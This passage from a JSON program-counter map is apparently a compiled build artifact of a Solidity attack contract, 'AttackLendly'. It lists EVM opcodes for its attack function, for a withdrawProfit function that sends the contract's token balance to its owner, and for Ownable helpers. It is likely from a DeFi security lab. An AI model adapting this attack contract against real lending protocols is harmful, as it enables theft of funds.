    "2311": {
      "op": "SUB"
    },
    "2312": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1725
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "2345": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1730
      ],
      "op": "AND",
      "path": "3"
    },
    "2346": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1730
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2347": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1730
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x22C0D9F"
    },
    "2352": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1730
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2353": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x945"
    },
    "2356": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2357": {
      "fn": "AttackLendly.attack",
      "offset": [
        1731,
        1732
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2359": {
      "fn": "AttackLendly.attack",
      "offset": [
        1731,
        1732
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2360": {
      "fn": "AttackLendly.attack",
      "offset": [
        1734,
        1744
      ],
      "op": "DUP7",
      "path": "3"
    },
    "2361": {
      "fn": "AttackLendly.attack",
      "offset": [
        1734,
        1744
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2362": {
      "fn": "AttackLendly.attack",
      "offset": [
        1754,
        1758
      ],
      "op": "ADDRESS",
      "path": "3"
    },
    "2363": {
      "fn": "AttackLendly.attack",
      "offset": [
        1754,
        1758
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2364": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "DUP8",
      "path": "3"
    },
    "2365": {
      "fn": "AttackLendly.attack",
      "offset": [
        1693,
        1711
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2366": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "2368": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "ADD",
      "path": "3"
    },
    "2369": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xF21"
    },
    "2372": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1721,
        1766
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2373": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2374": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2376": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2378": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2379": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2380": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP4",
      "path": "3"
    },
    "2381": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "SUB",
      "path": "3"
    },
    "2382": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2383": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2385": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP8",
      "path": "3"
    },
    "2386": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2387": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "EXTCODESIZE",
      "path": "3"
    },
    "2388": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2389": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2390": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2391": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x95F"
    },
    "2394": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2395": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2397": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2398": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2399": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2400": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "POP",
      "path": "3"
    },
    "2401": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "GAS",
      "path": "3"
    },
    "2402": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "CALL",
      "path": "3"
    },
    "2403": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2404": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2405": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2406": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x973"
    },
    "2409": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2410": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2411": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2413": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2414": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "2415": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2416": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2418": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2419": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2420": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "POP",
      "path": "3"
    },
    "2421": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "POP",
      "path": "3"
    },
    "2422": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "POP",
      "path": "3"
    },
    "2423": {
      "fn": "AttackLendly.attack",
      "offset": [
        1721,
        1766
      ],
      "op": "POP",
      "path": "3"
    },
    "2424": {
      "fn": "AttackLendly.attack",
      "offset": [
        1104,
        1774
      ],
      "op": "POP",
      "path": "3"
    },
    "2425": {
      "fn": "AttackLendly.attack",
      "offset": [
        1104,
        1774
      ],
      "op": "POP",
      "path": "3"
    },
    "2426": {
      "fn": "AttackLendly.attack",
      "jump": "o",
      "offset": [
        1067,
        1774
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2427": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2428": {
      "offset": [
        1094,
        1107
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x983"
    },
    "2431": {
      "offset": [
        1094,
        1105
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC65"
    },
    "2434": {
      "jump": "i",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2435": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2436": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2438": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2440": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2442": {
      "op": "SHL"
    },
    "2443": {
      "op": "SUB"
    },
    "2444": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2169,
        2191
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 23
    },
    "2445": {
      "branch": 37,
      "fn": "Ownable.transferOwnership",
      "offset": [
        2169,
        2191
      ],
      "op": "AND",
      "path": "0"
    },
    "2446": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9E8"
    },
    "2449": {
      "branch": 37,
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2450": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2452": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2453": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "2457": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "2459": {
      "op": "SHL"
    },
    "2460": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2461": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2462": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2464": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2466": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2467": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "ADD",
      "path": "0"
    },
    "2468": {
      "op": "MSTORE"
    },
    "2469": {
      "op": "PUSH1",
      "value": "0x26"
    },
    "2471": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2473": {
      "op": "DUP3"
    },
    "2474": {
      "op": "ADD"
    },
    "2475": {
      "op": "MSTORE"
    },
    "2476": {
      "op": "PUSH32",
      "value": "0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061"
    },
    "2509": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "2511": {
      "op": "DUP3"
    },
    "2512": {
      "op": "ADD"
    },
    "2513": {
      "op": "MSTORE"
    },
    "2514": {
      "op": "PUSH6",
      "value": "0x646472657373"
    },
    "2521": {
      "op": "PUSH1",
      "value": "0xD0"
    },
    "2523": {
      "op": "SHL"
    },
    "2524": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "2526": {
      "op": "DUP3"
    },
    "2527": {
      "op": "ADD"
    },
    "2528": {
      "op": "MSTORE"
    },
    "2529": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "2531": {
      "op": "ADD"
    },
    "2532": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x112"
    },
    "2535": {
      "op": "JUMP"
    },
    "2536": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2537": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2244,
        2272
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 24,
      "value": "0x9F1"
    },
    "2540": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2263,
        2271
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2541": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2244,
        2262
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCBF"
    },
    "2544": {
      "fn": "Ownable.transferOwnership",
      "jump": "i",
      "offset": [
        2244,
        2272
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2545": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2244,
        2272
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2546": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "POP",
      "path": "0"
    },
    "2547": {
      "fn": "Ownable.transferOwnership",
      "jump": "o",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2548": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3385,
        3561
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2549": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3436
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 25,
      "value": "0x0"
    },
    "2582": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2584": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2586": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2588": {
      "op": "SHL"
    },
    "2589": {
      "op": "SUB"
    },
    "2590": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3445
      ],
      "op": "AND",
      "path": "3"
    },
    "2591": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3445
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xA9059CBB"
    },
    "2596": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3446,
        3453
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xA35"
    },
    "2599": {
      "fn": "Ownable.owner",
      "offset": [
        1247,
        1254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2601": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2602": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2604": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2606": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2608": {
      "op": "SHL"
    },
    "2609": {
      "op": "SUB"
    },
    "2610": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "2611": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2612": {
      "fn": "Ownable.owner",
      "offset": [
        1201,
        1286
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2613": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3446,
        3453
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2614": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2616": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2617": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "2622": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2624": {
      "op": "SHL"
    },
    "2625": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2626": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2627": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3480,
        3484
      ],
      "op": "ADDRESS",
      "path": "3"
    },
    "2628": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "2630": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2631": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "ADD",
      "path": "3"
    },
    "2632": {
      "op": "MSTORE"
    },
    "2633": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3461
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "2666": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2668": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2670": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2672": {
      "op": "SHL"
    },
    "2673": {
      "op": "SUB"
    },
    "2674": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3471
      ],
      "op": "AND",
      "path": "3"
    },
    "2675": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3471
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2676": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3471
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x70A08231"
    },
    "2681": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3471
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2682": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2684": {
      "op": "ADD"
    },
    "2685": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "2687": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2689": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2690": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2691": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP4",
      "path": "3"
    },
    "2692": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "SUB",
      "path": "3"
    },
    "2693": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2694": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP7",
      "path": "3"
    },
    "2695": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "GAS",
      "path": "3"
    },
    "2696": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "STATICCALL",
      "path": "3"
    },
    "2697": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2698": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2699": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "2700": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xA99"
    },
    "2703": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "2704": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2705": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2707": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2708": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "2709": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2710": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "2712": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "REVERT",
      "path": "3"
    },
    "2713": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2714": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "POP",
      "path": "3"
    },
    "2715": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "POP",
      "path": "3"
    },
    "2716": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "POP",
      "path": "3"
    },
    "2717": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "POP",
      "path": "3"
    },
    "2718": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2720": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2721": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "2722": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "2724": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "NOT",
      "path": "3"
    },
    "2725": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "2727": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2728": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "ADD",
      "path": "3"
    },
    "2729": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "AND",
      "path": "3"
    },
    "2730": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP3",
      "path": "3"
    },
    "2731": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "ADD",
      "path": "3"
    },
    "2732": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2733": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2735": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2736": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "POP",
      "path": "3"
    },
    "2737": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2738": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "ADD",
      "path": "3"
    },
    "2739": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2740": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xABD"
    },
    "2743": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "2744": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2745": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE4F"
    },
    "2748": {
      "fn": "AttackLendly.withdrawProfit",
      "jump": "i",
      "offset": [
        3455,
        3486
      ],
      "op": "JUMP",
      "path": "3"
    },
    "2749": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3455,
        3486
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "2750": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2752": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2753": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2755": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2757": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2759": {
      "op": "SHL"
    },
    "2760": {
      "op": "SUB"
    },
    "2761": {
      "op": "NOT"
    },
    "2762": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0xE0"
    },
    "2764": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP6",
      "path": "3"
    },
    "2765": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "2766": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "SHL",
      "path": "3"
    },
    "2767": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "AND",
      "path": "3"
    },
    "2768": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP2",
      "path": "3"
    },
    "2769": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "2770": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2772": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2774": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2776": {
      "op": "SHL"
    },
    "2777": {
      "op": "SUB"
    },
    "2778": {
      "op": "SWAP1"
    },
    "2779": {
      "op": "SWAP3"
    },
    "2780": {
      "op": "AND"
    },
    "2781": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "2783": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP4",
      "path": "3"
    },
    "2784": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "ADD",
      "path": "3"
    },
    "2785": {
      "op": "MSTORE"
    },
    "2786": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2788": {
      "op": "DUP3"
    },
    "2789": {
      "op": "ADD"
    },
    "2790": {
      "op": "MSTORE"
    },
    "2791": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "2793": {
      "op": "ADD"
    },
    "2794": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "2796": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "2798": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "2799": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP1",
      "path": "3"
    },
    "2800": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "DUP4",
      "path": "3"
    },
    "2801": {
      "fn": "AttackLendly.withdrawProfit",
      "offset": [
        3430,
        3487
      ],
      "op": "SUB",
